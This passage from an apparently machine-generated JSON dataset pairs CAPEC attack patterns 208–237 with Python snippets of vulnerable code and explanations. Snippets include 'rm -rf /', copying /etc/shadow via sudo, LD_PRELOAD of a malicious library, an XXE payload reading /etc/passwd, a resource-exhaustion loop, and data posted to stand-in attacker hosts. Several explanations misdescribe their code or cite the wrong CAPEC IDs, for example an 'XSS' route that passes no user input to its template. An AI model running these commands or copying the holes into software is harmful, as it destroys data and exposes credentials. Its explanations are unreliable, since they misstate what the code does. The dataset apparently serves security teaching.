    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "import requests\n\n# Price per item set by the server\nprice_per_item = 100\n\n# Client-side calculation of total cost\n# Vulnerable to manipulation\nquantity = int(input('Enter quantity: '))\ntotal_cost = price_per_item * quantity\n\n# Attacker can modify the total_cost before sending to the server\n# For example, setting total_cost to a lower value\n# total_cost = 10\n\n# Sending the manipulated total cost to the server\nresponse = requests.post('https://example.com/purchase', data={'total_cost': total_cost})\n\nprint('Server response:', response.text)",
        "description": "This Python code snippet demonstrates a vulnerable client-side calculation of the total cost of a purchase. The server provides a price per item, and the client calculates the total cost based on the quantity input by the user. However, the client-side logic is susceptible to manipulation by an attacker, who can modify the total cost before sending it to the server. This can result in incorrect billing, allowing the attacker to make purchases at a fraction of the legitimate cost. The code embodies the main idea of CAPEC by showing how reliance on client-side calculations can lead to security vulnerabilities, as described in the related CWEs."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "from flask import Flask, request, send_file, Response\nimport os\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    if file:\n        filename = file.filename\n        file.save(os.path.join('/tmp', filename))\n        return 'File uploaded successfully'\n    return 'No file uploaded'\n\n@app.route('/serve/<filename>')\ndef serve_file(filename):\n    file_path = os.path.join('/tmp', filename)\n    if os.path.exists(file_path):\n        mime_type = 'text/plain' if filename.endswith('.txt') else 'application/octet-stream'\n        return send_file(file_path, mimetype=mime_type)\n    return 'File not found', 404\n\n@app.route('/view/<filename>')\ndef view_file(filename):\n    file_path = os.path.join('/tmp', filename)\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as file:\n            content = file.read()\n        return Response(content, mimetype='text/html')\n    return 'File not found', 404\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows file uploads and serves files based on their extensions. The '/upload' endpoint allows users to upload files, which are saved to a temporary directory. The '/serve/<filename>' endpoint serves the uploaded files with a MIME type based on the file extension, which can be exploited if the MIME type does not match the actual content. The '/view/<filename>' endpoint reads the file content and returns it as an HTML response, which can lead to XSS if the file contains malicious scripts. This code demonstrates vulnerabilities related to improper input validation (CWE-20), reliance on file extension (CWE-646), and improper neutralization of input (CWE-79, CWE-82, CWE-84), embodying the main idea of the CAPEC 'XSS Using MIME Type Mismatch'."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable to XSS due to improper neutralization of input\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\n@app.route('/error')\ndef error():\n    # Exposing sensitive information in default error page\n    raise Exception('This is a sensitive error message')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with two routes: '/search' and '/error'. The '/search' route is vulnerable to Cross-Site Scripting (XSS) because it directly embeds user input into the HTML output without proper neutralization, which relates to CWE-79 and CWE-82. The '/error' route raises an exception that exposes a sensitive error message, which is an example of CWE-7. This code embodies the main idea of the deprecated CAPEC by showing how improper handling of user input and misconfiguration can lead to security vulnerabilities."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import os\n\ndef read_sensitive_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError(f\"The file {file_path} does not exist.\")\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Example of misuse: reading a sensitive system file\nsensitive_data = read_sensitive_file('/etc/passwd')\nprint(sensitive_data)",
        "description": "This Python code snippet demonstrates a functionality misuse by leveraging a legitimate capability of the application to read a sensitive system file. The `read_sensitive_file` function is designed to read the contents of a file given its path. However, it can be misused to read sensitive system files like '/etc/passwd', which contains user account information. This misuse aligns with the CAPEC description, as it leverages the file reading functionality in an unintended way to access unauthorized, sensitive data. The code also touches on CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing the contents of a sensitive file."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/data/'\n    full_path = os.path.join(base_directory, file_path)\n    \n    if not full_path.startswith(base_directory):\n        raise ValueError('Invalid file path')\n    \n    with open(full_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = '../../etc/passwd'\ntry:\n    content = read_file(user_input)\n    print(content)\nexcept Exception as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of file reading that is susceptible to path traversal attacks. The function `read_file` takes a `file_path` provided by the user and constructs a full path by joining it with a base directory (`/var/www/data/`). The code attempts to check if the constructed path starts with the base directory to prevent directory traversal. However, this check is insufficient because it does not properly neutralize sequences like '/../', '....', '...', '/dir/../filename', or '.../...//', which can be used to traverse outside the intended directory. An attacker can exploit this vulnerability by providing input such as '../../etc/passwd' to read sensitive files outside the restricted directory."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import socket\n\n# Direct use of sockets instead of a framework method call (CWE-246)\ndef fetch_data_from_server(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        s.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + host.encode() + b'\\r\\n\\r\\n')\n        response = s.recv(4096)\n        s.close()\n        return response\n    except Exception as e:\n        # Missing custom error page and exposing stack trace (CWE-7)\n        print(f\"Error: {e}\")\n\n# Example usage\nresponse = fetch_data_from_server('example.com', 80)\nprint(response)",
        "description": "This Python code snippet demonstrates a direct use of sockets to fetch data from a server, which is a bad practice in J2EE applications (CWE-246). The function `fetch_data_from_server` connects to a server using a socket, sends an HTTP GET request, and receives the response. If an exception occurs, it prints the error message, potentially exposing sensitive information (CWE-7). This code embodies the main idea of the deprecated CAPEC, which involves using fuzzing techniques to gather stack traces and map applications, by showing how improper error handling and direct socket usage can lead to information exposure."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import logging\n\n# Configure logging\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Function that processes user input\ndef process_input(user_input):\n    try:\n        # Simulate processing of user input\n        if not isinstance(user_input, str):\n            raise ValueError('Invalid input type')\n        # Simulate a potential error\n        if user_input == 'trigger_error':\n            raise RuntimeError('Simulated runtime error')\n        return 'Processed successfully'\n    except Exception as e:\n        # Log the error with sensitive information\n        logging.error(f'Error processing input: {e}, user_input: {user_input}')\n        return 'An error occurred'\n\n# Example usage\nuser_inputs = ['valid_input', 123, 'trigger_error']\nfor input in user_inputs:\n    print(process_input(input))",
        "description": "This Python code snippet demonstrates a vulnerable application that processes user input and logs errors. The `process_input` function simulates processing user input and raises exceptions for invalid input types or specific error-triggering inputs. When an exception occurs, the error message, along with the sensitive user input, is logged to a file (`app.log`). This embodies the main idea of CAPEC-196 (Fuzzing for application mapping) by showing how an attacker could send various inputs to the application and observe the log file for error messages containing sensitive information. The related CWEs are represented by the logging of sensitive information (CWE-209, CWE-532, CWE-210) and the exposure of sensitive system information (CWE-497)."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 12345))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} accepted')\n    data = client_socket.recv(1024)\n    if data:\n        print(f'Received data: {data.decode()}')\n        # No integrity check or authentication\n        client_socket.send(b'ACK')\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections and processes data without proper authentication or integrity checks. The server accepts connections from any client and processes the received data without verifying the source or ensuring the data's integrity. This embodies the main idea of CAPEC 'Communication Channel Manipulation' and related CWEs, such as CWE-306 (Missing Authentication for Critical Function), CWE-924 (Improper Enforcement of Message Integrity During Transmission), and CWE-940 (Improper Verification of Source of a Communication Channel). The lack of these security measures makes the communication channel susceptible to manipulation, potentially leading to information exposure or system compromise."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import ssl\nimport socket\n\n# Create an SSL context with incorrect configuration\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\ncontext.verify_mode = ssl.CERT_NONE  # No certificate verification\n\n# Create a socket and wrap it with the SSL context\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nssl_sock = context.wrap_socket(sock, server_hostname='example.com')\n\n# Connect to the server\nssl_sock.connect(('example.com', 443))\n\n# Send sensitive data over the incorrectly configured SSL/TLS connection\nsensitive_data = 'username=admin&password=secret'\nssl_sock.sendall(sensitive_data.encode('utf-8'))\n\n# Close the connection\nssl_sock.close()",
        "description": "This Python code snippet demonstrates an SSL/TLS connection with incorrect configuration, embodying the main idea of CAPEC-153: 'Exploiting Incorrectly Configured SSL/TLS'. The SSL context is created with `ssl.PROTOCOL_TLSv1`, which is outdated and insecure. Additionally, `context.verify_mode` is set to `ssl.CERT_NONE`, meaning no certificate verification is performed, making the connection vulnerable to man-in-the-middle attacks. The code then sends sensitive data ('username=admin&password=secret') over this insecure connection. This example also touches on related CWEs: CWE-201 (insertion of sensitive information into sent data), CWE-294 (potential for capture-replay attacks due to lack of proper security), CWE-923 (improper restriction of communication channel), CWE-602 (client-side enforcement of server-side security), and CWE-940 (improper verification of the source of a communication channel)."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# Function to send a UDDI message\n\ndef send_uddi_message(url, message):\n    try:\n        response = requests.post(url, data=message)\n        if response.status_code == 200:\n            return response.text\n        else:\n            return None\n    except Exception as e:\n        print(f\"Error sending message: {e}\")\n        return None\n\n# Example UDDI message (without proper validation and verification)\nuddi_message = '''\n<uddi:businessEntity xmlns:uddi=\"urn:uddi-org:api_v3\">\n    <uddi:businessKey>invalid-key</uddi:businessKey>\n    <uddi:name>Fake Business</uddi:name>\n</uddi:businessEntity>\n'''\n\n# URL of the UDDI service (incorrectly specified destination)\nuddi_service_url = \"http://malicious-actor.com/uddi\"\n\n# Send the UDDI message\nresponse = send_uddi_message(uddi_service_url, uddi_message)\n\nif response:\n    print(\"Received response:\")\n    print(response)\nelse:\n    print(\"Failed to receive a valid response.\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of sending a UDDI message. The function `send_uddi_message` sends a UDDI message to a specified URL without proper validation and verification of the message's authenticity and integrity. The UDDI message contains a fake business entity, and the destination URL is incorrectly specified, potentially pointing to a malicious actor. This code embodies the main idea of the CAPEC 'Spoofing of UDDI/ebXML Messages' by showing how an attacker could spoof a UDDI message to impersonate a service provider. The related CWEs are represented by the lack of data authenticity verification (CWE-345), incorrect destination specification (CWE-941), and missing XML validation (CWE-112)."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport requests\n\n# Simulate receiving an XML message\nxml_data = '''\n<root>\n    <data>Some data</data>\n    <route>http://malicious-node.com/process</route>\n</root>\n'''\n\n# Parse the XML data\ntry:\n    root = ET.fromstring(xml_data)\nexcept ET.ParseError as e:\n    print(f'Failed to parse XML: {e}')\n    exit(1)\n\n# Extract the route from the XML (CWE-610)\nroute = root.find('route').text\n\n# Forward the XML to the specified route (CWE-441)\ntry:\n    response = requests.post(route, data=xml_data)\n    print(f'Response from {route}: {response.text}')\nexcept requests.RequestException as e:\n    print(f'Failed to forward XML: {e}')\n",
        "description": "This Python code snippet demonstrates a simplified version of an XML Routing Detour Attack. The code simulates receiving an XML message, parsing it, and then forwarding it to a route specified within the XML content. This embodies the main idea of CAPEC-94, where an attacker can manipulate the routing of XML content by compromising an intermediate system. The code also highlights related CWEs: CWE-610 (Externally Controlled Reference to a Resource in Another Sphere) by using an externally controlled route, and CWE-441 (Unintended Proxy or Intermediary) by forwarding the XML to an external actor without proper validation or control."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import socket\n\n# CWE-246: Direct use of sockets\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect(('example.com', 80))\n\n# CWE-757: Algorithm Downgrade\n# Simulating a weak algorithm selection during negotiation\nselected_algorithm = 'MD5'  # Weak algorithm\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# Client-side enforcement of security policy\nif selected_algorithm == 'MD5':\n    print('Warning: Using a weak algorithm for encryption')\n\n# CWE-294: Authentication Bypass by Capture-replay\n# Simulating a simple authentication mechanism\nauth_token = 'auth_token_123'\nclient_socket.send(auth_token.encode())\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# Incorrectly specifying the destination\nclient_socket.sendto(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n', ('wrong-destination.com', 80))\n\nresponse = client_socket.recv(4096)\nprint(response.decode())\nclient_socket.close()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the 'Client-Server Protocol Manipulation' CAPEC. It uses direct socket communication (CWE-246) to connect to a server. During the connection, it selects a weak algorithm (MD5) for encryption (CWE-757) and warns the user about it. The code also shows client-side enforcement of security policies (CWE-602), which is not reliable. It sends an authentication token that could be captured and replayed by an attacker (CWE-294). Finally, it incorrectly specifies the destination in the communication channel (CWE-941), which could lead to data being sent to an unintended recipient. This code highlights the risks and weaknesses in client-server communication protocols when not properly secured."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY ext SYSTEM \"file:///dev/random\">\n]>\n<root>&ext;</root>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        print(ET.tostring(root, encoding='unicode'))\n    except ET.ParseError as e:\n        print(f'Parse error: {e}')\n\nparse_xml(xml_data)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Data Serialization External Entities Blowup' (CAPEC). The code uses the `xml.etree.ElementTree` module to parse an XML document that includes an external entity reference. The XML data contains a DOCTYPE declaration with an external entity `ext` that points to `file:///dev/random`, a special file in Unix-like systems that provides random data. When the XML parser processes this entity, it attempts to read from `/dev/random`, which can consume a large amount of resources and potentially lead to a denial of service (DoS) condition. This example embodies CWE-611 (Improper Restriction of XML External Entity Reference) by allowing external entities to be processed without restriction, which can lead to resource exhaustion or other unintended behaviors."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<html>\n<head><title>Vulnerable Page</title></head>\n<body>\n    <iframe src=\"http://malicious-site.com\" width=\"0\" height=\"0\" style=\"opacity:0;position:absolute;top:0;left:0;\"></iframe>\n    <h1>Welcome to the Safe Site</h1>\n    <form action=\"/submit\" method=\"post\">\n        <input type=\"text\" name=\"user_input\" />\n        <input type=\"submit\" value=\"Submit\" />\n    </form>\n</body>\n</html>'''\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    return render_template_string(f'<h1>You submitted: {user_input}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses Flask to create a simple web application that demonstrates an iFrame overlay attack. The main page includes an invisible iFrame that loads content from a malicious site. This iFrame is styled to be invisible and positioned over the entire page, tricking the user into interacting with the malicious content while thinking they are interacting with the legitimate site. The form submission endpoint reflects user input without proper sanitization, making it vulnerable to cross-site scripting (XSS) attacks. This example embodies the CAPEC 'iFrame Overlay' attack and incorporates related CWEs such as improper restriction of rendered UI layers or frames (CWE-1021) and improper neutralization of input during web page generation (CWE-79)."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import platform\nimport socket\nimport os\n\n# Function to gather system information\ndef gather_system_info():\n    info = {}\n    info['os'] = platform.system()\n    info['os_version'] = platform.version()\n    info['hostname'] = socket.gethostname()\n    info['ip_address'] = socket.gethostbyname(info['hostname'])\n    info['cpu_info'] = platform.processor()\n    return info\n\n# Function to simulate exposure of sensitive information\ndef expose_sensitive_info():\n    system_info = gather_system_info()\n    # Simulate exposure of sensitive information\n    print(\"Sensitive System Information:\")\n    for key, value in system_info.items():\n        print(f\"{key}: {value}\")\n\n# Main function\nif __name__ == '__main__':\n    expose_sensitive_info()",
        "description": "This Python code snippet demonstrates the concept of fingerprinting by gathering and exposing sensitive system information. The `gather_system_info` function collects details such as the operating system, OS version, hostname, IP address, and CPU information. The `expose_sensitive_info` function then prints this information, simulating the exposure of sensitive system information to an unauthorized actor. This example embodies the CAPEC idea of fingerprinting and highlights related CWEs such as the exposure of sensitive information (CWE-200, CWE-497) and observable behavioral discrepancies (CWE-207)."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.sha256(f'{username}{password}'.encode()).hexdigest()\n        sessions[session_id] = username\n        resp = make_response('Logged in')\n        resp.set_cookie('session_id', session_id)\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    session_id = request.cookies.get('session_id')\n    if session_id in sessions:\n        return f'Welcome {sessions[session_id]}'\n    return 'Unauthorized', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple web application using Flask that is vulnerable to session credential falsification through manipulation. The application has a login route that sets a session cookie without proper validation and integrity checking (CWE-565). The session ID is generated using a hash of the username and password, which can be predictable and manipulated if intercepted. The dashboard route relies on the session cookie without verifying its integrity, making it susceptible to external control of assumed-immutable web parameters (CWE-472). Additionally, the code does not invalidate old session IDs upon login (CWE-384) and does not handle session expiration (CWE-613). The authentication is performed on the client side by setting a cookie, which can be bypassed by modifying the client (CWE-603)."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import threading\nimport time\nimport requests\n\n# URL of the target resource\nurl = 'http://example.com/resource'\n\n# Function to repeatedly engage the resource\ndef engage_resource():\n    while True:\n        try:\n            response = requests.get(url)\n            # Simulate processing time to keep the resource engaged\n            time.sleep(0.5)\n        except requests.exceptions.RequestException as e:\n            print(f'Error: {e}')\n\n# Create multiple threads to simulate sustained engagement\nthreads = []\nfor i in range(10):\n    thread = threading.Thread(target=engage_resource)\n    threads.append(thread)\n    thread.start()\n\n# Join threads to keep the main program running\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a sustained client engagement attack. The code repeatedly sends requests to a specified URL, simulating a scenario where an adversary keeps a resource engaged for an extended period. Multiple threads are created to amplify the effect, making it harder for legitimate users to access the resource. This embodies the CAPEC's main idea of denying access by tying up resources without crashing or flooding the target. The code also reflects related CWEs, such as uncontrolled resource consumption (CWE-400) and allocation of resources without limits (CWE-770), by continuously engaging the resource without any throttling or limits."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        print(ET.tostring(root, encoding='unicode'))\n    except ET.ParseError as e:\n        print(f'Parse error: {e}')\n\nparse_xml(xml_data)",
        "description": "This Python code snippet demonstrates a DTD Injection vulnerability. The XML data includes a Document Type Definition (DTD) that defines an external entity 'xxe' which references the local file '/etc/passwd'. When the XML is parsed, the external entity is expanded, potentially exposing sensitive information. This example embodies the main idea of CAPEC-112 (DTD Injection) and highlights related weaknesses such as CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-827 (Improper Control of Document Type Definition). The code attempts to parse the malicious XML, which can lead to resource depletion or unauthorized data access."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML parser without resource limits\nxml_data = '''<root>''' + ''.join([f'<item>{i}</item>' for i in range(1000000)]) + '''</root>'''\n\ntry:\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(f'Parsed {len(root)} items.')\nexcept ET.ParseError as e:\n    print(f'Failed to parse XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerable XML parser that does not impose any limits on the size or number of elements it can parse, leading to a potential denial of service (DoS) condition. The code constructs an XML string with a million 'item' elements and attempts to parse it using the `xml.etree.ElementTree` module. This can exhaust CPU resources due to the inefficient handling of large datasets, embodying the 'Serialized Data Parameter Blowup' attack described in the CAPEC. The related CWE-770 (Allocation of Resources Without Limits or Throttling) is represented here as the parser does not restrict the number of elements it processes, leading to resource exhaustion."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(xml_data))\n        root = tree.getroot()\n        process_node(root)\n    except ET.ParseError as e:\n        print(f'XML parsing error: {e}')\n\ndef process_node(node, depth=0):\n    if depth > 1000:  # Uncontrolled recursion limit\n        raise RecursionError('Maximum recursion depth exceeded')\n    for child in node:\n        process_node(child, depth + 1)\n\n# Example of nested XML payload\nxml_payload = '''\n<root>\n  <child>\n    <child>\n      <child>\n        <!-- More nested children -->\n      </child>\n    </child>\n  </child>\n</root>\n'''\n\nparse_xml(xml_payload)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC). The code uses the `xml.etree.ElementTree` module to parse an XML string. The `parse_xml` function attempts to parse the XML data and process its nodes recursively using the `process_node` function. The `process_node` function includes a depth parameter to track the recursion depth and raises a `RecursionError` if the depth exceeds 1000, illustrating CWE-674 (Uncontrolled Recursion). The example XML payload shows a deeply nested structure that could lead to excessive memory consumption and CPU utilization, representing the main idea of the CAPEC. The code lacks proper XML validation (CWE-112) and input validation (CWE-20), making it susceptible to resource exhaustion attacks (CWE-770)."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function that parses XML without validation\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        return tree\n    except ET.ParseError as e:\n        print(f\"Parse error: {e}\")\n\n# Example of an oversized serialized data payload\noversized_payload = \"<root>\" + \"<element>\" * 1000000 + \"</element>\" * 1000000 + \"</root>\"\n\n# Calling the vulnerable function with the oversized payload\nparse_xml(oversized_payload)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Oversized Serialized Data Payloads' (CAPEC). The function `parse_xml` takes an XML string as input and parses it using the `xml.etree.ElementTree` module without any validation. This lack of validation (CWE-112) allows an adversary to inject an oversized serialized data payload, which can exhaust system resources (CWE-770) and potentially lead to denial of service. The example payload is a large XML string with a million nested elements, which can cause excessive memory consumption and potentially crash the parser. This snippet highlights the importance of proper input validation and resource management to prevent such attacks."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "import os\n\ndef execute_command(user_role, command):\n    if user_role == 'admin':\n        os.system(command)\n    else:\n        print('Insufficient privileges to execute the command')\n\n# Simulate a privilege escalation vulnerability\nuser_role = 'user'\ncommand = 'rm -rf /'\n\n# Improper privilege management: bypassing the check\nif user_role != 'admin':\n    user_role = 'admin'  # Vulnerability: Escalating privileges improperly\n\nexecute_command(user_role, command)",
        "description": "This Python code snippet demonstrates a privilege escalation vulnerability. The `execute_command` function checks if the `user_role` is 'admin' before executing a system command. However, the code simulates a privilege escalation by improperly changing the `user_role` from 'user' to 'admin' without proper authorization. This represents CWE-269 (Improper Privilege Management) as it shows how privileges can be improperly assigned. The code also touches on CWE-274 (Improper Handling of Insufficient Privileges) by showing how insufficient privileges are incorrectly handled, leading to a potential security breach. The main idea of the CAPEC is illustrated by showing how an adversary could exploit this weakness to perform unauthorized actions."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\nos.chmod('/tmp/critical_file', 0o777)  # Critical file with world-writable permissions\n\n# CWE-250: Execution with Unnecessary Privileges\n# Running a subprocess with elevated privileges\nsubprocess.run(['sudo', 'ls', '/root'], check=True)\n\n# CWE-114: Process Control\n# Loading a library from an untrusted source\nos.system('LD_PRELOAD=/tmp/malicious.so ls')\n\n# CWE-271: Privilege Dropping / Lowering Errors\n# Not dropping privileges after performing a privileged operation\nos.setuid(1000)  # Attempt to drop privileges but not properly handled\n\n# CWE-648: Incorrect Use of Privileged APIs\n# Using a privileged API incorrectly\nos.system('sudo cp /etc/shadow /tmp/shadow_copy')",
        "description": "This Python code snippet demonstrates several security weaknesses that can lead to hijacking a privileged process. The code includes: 1) Incorrect permission assignment (CWE-732) by setting world-writable permissions on a critical file. 2) Execution with unnecessary privileges (CWE-250) by running a subprocess with elevated privileges. 3) Process control (CWE-114) by loading a library from an untrusted source. 4) Privilege dropping errors (CWE-271) by not properly handling privilege dropping. 5) Incorrect use of privileged APIs (CWE-648) by using 'sudo' to copy a sensitive file. These weaknesses can be exploited by an attacker to gain control of a privileged process and execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "import threading\nimport socket\n\n# Non-final static storable\nshared_data = {'auth_token': None}\n\n# Function to simulate privileged operation\ndef privileged_operation(token):\n    if token == shared_data['auth_token']:\n        print('Privileged operation executed')\n    else:\n        print('Access denied')\n\n# Function to simulate network capture-replay attack\ndef capture_replay_attack():\n    # Simulate capturing the token\n    captured_token = shared_data['auth_token']\n    # Replay the captured token\n    privileged_operation(captured_token)\n\n# Function to simulate setting the auth token\ndef set_auth_token(token):\n    shared_data['auth_token'] = token\n\n# Simulate setting the auth token in a multi-threaded environment\nthread1 = threading.Thread(target=set_auth_token, args=('secure_token',))\nthread2 = threading.Thread(target=capture_replay_attack)\n\nthread1.start()\nthread2.start()\n\nthread1.join()\nthread2.join()",
        "description": "This Python code snippet demonstrates a vulnerable scenario where a privileged operation can be hijacked due to improper handling of shared data in a multi-threaded environment. The `shared_data` dictionary contains a non-final static storable element `auth_token`. The `privileged_operation` function checks the token against this shared data to grant access. The `capture_replay_attack` function simulates a capture-replay attack by capturing and replaying the token. The `set_auth_token` function sets the token in a multi-threaded context, potentially leading to race conditions. This code embodies the main idea of the deprecated CAPEC pattern by showing how a privileged thread of execution can be hijacked due to improper synchronization and shared data handling, aligning with CWE-294, CWE-373, and CWE-1058."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import os\nimport signal\nimport ctypes\n\n# CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n# CWE-391: Unchecked Error Condition\n\ndef privileged_function():\n    try:\n        # Simulate privileged operation\n        print(\"Performing privileged operation...\")\n        raise Exception(\"Simulated Exception\")\n    except Exception as e:\n        print(f\"Exception caught: {e}\")\n\n# Signal handler that is not asynchronous-safe\n# CWE-828: This handler performs non-reentrant operations\n# CWE-391: Error conditions are not properly checked\n\ndef signal_handler(signum, frame):\n    print(\"Signal handler called\")\n    privileged_function()  # Calling a function that is not safe to call from a signal handler\n\n# Register the signal handler\nsignal.signal(signal.SIGUSR1, signal_handler)\n\n# Simulate sending a signal to the process\nos.kill(os.getpid(), signal.SIGUSR1)\n\n# CWE-782: Exposed IOCTL with Insufficient Access Control\n# Simulate an IOCTL call without proper access control\nclass Device:\n    def ioctl(self, command):\n        if command == \"restricted_command\":\n            print(\"Executing restricted command\")\n        else:\n            print(\"Executing normal command\")\n\ndevice = Device()\ndevice.ioctl(\"restricted_command\")",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the deprecated CAPEC pattern 'Catching exception throw/signal from privileged block' and its related CWEs. The code includes a signal handler that is not asynchronous-safe (CWE-828) and calls a privileged function that can raise exceptions (CWE-391). Additionally, it simulates an IOCTL call without proper access control (CWE-782). The signal handler performs non-reentrant operations, and the privileged function does not properly handle exceptions, leading to potential security risks. The IOCTL call demonstrates insufficient access control, allowing restricted commands to be executed without proper checks."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "import ctypes\n\n# Unsafe JNI equivalent in Python using ctypes to call C code\nlibc = ctypes.CDLL('libc.so.6')\n\n# Function to call system command using C library\ndef unsafe_system_call(command):\n    libc.system(command.encode('utf-8'))\n\n# Example usage\nunsafe_system_call('echo Hello, World!')\nunsafe_system_call('rm -rf /')  # Dangerous command\n",
